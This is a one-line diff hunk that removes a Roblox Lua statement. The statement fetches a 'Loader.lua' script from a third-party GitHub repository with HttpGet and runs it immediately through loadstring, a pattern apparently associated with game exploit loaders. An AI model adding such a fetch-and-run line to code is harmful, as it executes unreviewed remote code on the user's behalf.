@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zicus-scripts/gay-scripts/main/Loader.lua"), true)()
